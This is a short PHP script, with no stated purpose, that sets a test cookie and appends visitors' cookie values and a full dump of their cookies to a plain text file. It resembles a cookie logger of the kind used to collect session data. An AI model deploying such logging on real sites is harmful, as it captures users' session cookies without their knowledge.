<?php
if(!empty($_COOKIE["c"])){
 file_put_contents('a.txt',$_COOKIE["c"],FILE_APPEND);
}else{
setcookie("c","value",time()+10000);
}
$reIP=$_SERVER["REMOTE_ADDR"];
file_put_contents('a.txt',print_r($_COOKIE,true),FILE_APPEND); 
